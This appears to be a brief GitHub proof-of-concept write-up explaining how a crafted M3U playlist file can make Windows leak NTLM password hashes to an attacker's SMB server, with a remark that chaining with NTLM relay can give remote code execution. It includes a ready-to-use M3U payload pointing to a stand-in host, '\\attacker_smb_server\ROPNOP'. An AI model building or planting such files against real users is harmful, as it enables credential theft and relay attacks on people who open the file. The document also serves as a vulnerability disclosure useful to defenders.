# NTLM-THEFT VIA M3U FILE 

Rather than exploiting the vulnerability in Microsoft Word files or Outlook’s handling of RTF files, an attackers will take the 

advantage of "M3U file extension Audio Playlist" a  file that stands for MP3 URL, the m3u file , isn't an actual audio file in and 

of itself. 

An M3U file just points to audio (and sometimes video) files so that a media player can queue them for playback. These text-based 

files can contain URLs and/or absolute or relative pathnames to the media files and/or folders.

The attacker can then use this to inject malicious content into a “M3U” file  ex : SMB Server , so when that file  is opened, the 

target automatically leaks credentials in the form of NTLM hashes.

# NOTE:  RCE can be achieved by chaining NTLM theft with smb signing disabled using ntlm relay .




Tested on windows 7  “all player"


PoC :

#EXTM3U
#EXTINF:-1,leak_it_please

\\attacker_smb_server\ROPNOP

Save it as m3u extention.
![](https://github.com/kofa2002/NTLM-THEFT/blob/master/M3U.PNG)


![](https://github.com/kofa2002/NTLM-THEFT/blob/master/Screenshot%20from%202019-05-04%2008-11-15.png)


Author : Soufian El Hachmi
